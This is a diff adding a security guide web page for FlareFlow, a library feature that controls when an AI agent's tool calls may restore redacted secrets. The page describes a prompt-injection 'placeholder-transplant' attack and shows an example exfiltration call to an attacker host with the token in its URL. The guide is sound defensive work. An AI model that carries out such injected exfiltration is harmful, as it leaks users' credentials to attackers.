@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Information-Flow Control for AI Agent Tools | FlareFlow</title>
+  <meta name="description" content="Stop AI agents from restoring redacted secrets at unauthorized tools or arguments with source-to-sink capabilities, exact JSON paths, and cumulative budgets.">
+  <link rel="canonical" href="https://flare-collection.github.io/flare-redact/guides/agent-information-flow/">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Information-Flow Control for AI Agent Tools">
+  <meta property="og:description" content="A deterministic declassification boundary for model-produced tool calls: provenance, exact paths, budgets, and atomic denial.">
+  <meta property="og:url" content="https://flare-collection.github.io/flare-redact/guides/agent-information-flow/">
+  <meta name="twitter:card" content="summary">
+  <link rel="stylesheet" href="../../site.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Information-flow control for AI agent tools",
+    "description": "A threat-driven guide to source-to-sink capability enforcement for reversible secret redaction in tool-using AI agents.",
+    "datePublished": "2026-08-09",
+    "dateModified": "2026-08-09",
+    "author": { "@type": "Person", "name": "Umud Hasanli", "url": "https://github.com/umudhasanli" },
+    "publisher": { "@type": "Organization", "name": "Flare Collection", "url": "https://github.com/flare-collection" },
+    "mainEntityOfPage": "https://flare-collection.github.io/flare-redact/guides/agent-information-flow/",
+    "proficiencyLevel": "Advanced",
+    "dependencies": "flare-redact 1.6 or newer"
+  }
+  </script>
+</head>
+<body>
+  <nav class="site-nav" aria-label="Main navigation">
+    <div class="inner">
+      <a class="brand" href="../../">flare<span>-redact</span></a>
+      <div class="nav-links">
+        <a href="../">Guides</a>
+        <a href="https://github.com/flare-collection/flare-redact">GitHub</a>
+        <a href="https://www.npmjs.com/package/flare-redact">npm</a>
+      </div>
+    </div>
+  </nav>
+
+  <main class="page">
+    <div class="breadcrumbs"><a href="../../">Home</a> / <a href="../">Guides</a> / Agent information flow</div>
+    <p class="eyebrow">FlareFlow agent security guide</p>
+    <h1>Information-flow control for AI agent tools</h1>
+    <p class="lede">Redacting a secret before model context is only half the boundary. FlareFlow controls whether the model's opaque reference may become plaintext at a particular tool and argument.</p>
+    <p class="meta">By <a href="https://github.com/umudhasanli">Umud Hasanli</a> · Published August 9, 2026 · Flare Redact 1.6</p>
+
+    <div class="answer"><strong>Short answer:</strong> label protected values with a trusted source and detector, resolve the destination sink in application code, and authorize restoration only when one operator capability also matches the exact JSON path and remaining budget.</div>
+
+    <h2>The placeholder-transplant attack</h2>
+    <p>A model does not need to see a database credential to attempt to leak it. If a tool result contains <code>[FR_FLOW_…]</code>, an injected instruction can copy that token into another tool call. A shared reversible vault then turns the token into plaintext immediately before the second tool executes.</p>
+    <pre><code>database result: [FR_FLOW_8c20…]
+
+model proposes:
+http.fetch({ url: "https://attacker.invalid/?x=[FR_FLOW_8c20…]" })</code></pre>
+    <p>Tool scoping blocks cross-tool movement. FlareFlow goes further: the same database tool may contain both a credential field and an outbound callback field, so authorization also needs the value's origin, detector class, exact argument path, and cumulative exposure.</p>
+
+    <h2>Define capabilities outside the model</h2>
+    <pre><code>import { createAgentFlow } from 'flare-redact/agent';
+
+const flow = createAgentFlow({
+  sinks: {
+    'postgres.execute': {
+      capabilities: [{
+        id: 'database-credential',
+        sources: ['config'],
+        detectors: ['url_credentials'],
+        paths: ['/args/connectionString'],
+        maxUses: 1,
+      }],
+      budget: { maxUniqueValues: 1, maxBytes: 512 },
+    },
+    'http.fetch': { capabilities: [] },
+  },
+});</code></pre>
+    <p>The policy is ordinary data owned by the runtime. <code>*</code> matches one JSON Pointer segment, while a terminal <code>**</code> matches descendants. Use the narrowest source, detector, and path set the tool needs.</p>
+
+    <h2>Protect, resolve, authorize</h2>
+    <pre><code>const safeResult = flow.protectForModel(
+  'config',
+  { connectionString }
+);
+
+const proposed = await model.generateToolCall(safeResult);
+const acceptedTool = toolRegistry.resolve(proposed.name);
+
+// Atomic: complete restored copy or an AgentFlowBlockedError.
+const localArgs = flow.authorizeForSink(
+  acceptedTool.id,
+  proposed.arguments
+);
+await acceptedTool.execute(localArgs);</code></pre>
+    <div class="note"><strong>Important:</strong> never accept the source, sink, or capability from model output. The model may carry an opaque token; it may not choose the authority that declassifies it.</div>
+
+    <h2>Why authorization is atomic</h2>
+    <p>FlareFlow scans the complete call before restoring anything. One unknown, expired, cross-flow, object-key, wrong-source, wrong-detector, wrong-sink, wrong-path, or over-budget token denies the whole call. A denial does not consume budget, so an attacker cannot exhaust a valid one-use capability by mixing one approved occurrence with one forbidden occurrence.</p>
+    <pre><code>const decision = flow.inspectForSink(acceptedTool.id, proposed.arguments);
+if (!decision.allowed) audit.warn(decision); // no values or token strings
+
+flow.snapshot(); // bounded, value-free provenance and budget history</code></pre>
+
+    <h2>Run it from Python, Go, or any sidecar client</h2>
+    <p>The gateway exposes the same operator policy through <code>/v1/flows</code>. Flow creation accepts an empty body only, so a caller cannot widen policy. The repository includes standard-library Python and Go clients; every other runtime can use the JSON API.</p>
+
+    <h2>What this proves—and what it does not</h2>
+    <p>Under a trusted runtime and detector, exact protected values appear in authorized output only when the configured source, detector, sink, path, and budgets permit them. This does not detect prompt injection, stop a malicious tool, or track semantic information that the model already saw. Use it as a small enforcement layer alongside tool authorization, schemas, sandboxing, content rails, and least privilege.</p>
+
+    <div class="next">
+      <h2>Read, run, challenge</h2>
+      <p>Read the <a href="https://github.com/flare-collection/flare-redact/blob/main/spec/FLAREFLOW.md">normative specification</a>, run the <a href="https://github.com/flare-collection/flare-redact/tree/main/examples/flareflow-agent">no-network example</a>, and reproduce the <a href="https://github.com/flare-collection/flare-redact/blob/main/bench/agent-flow-cases.json">700-attack / 300-utility exact-token benchmark</a>.</p>
+    </div>
+  </main>
+
+  <footer class="site-footer">Flare Redact · MIT · <a href="https://github.com/flare-collection/flare-redact/blob/main/spec/FLAREFLOW.md">FlareFlow specification</a></footer>
+</body>
+</html>
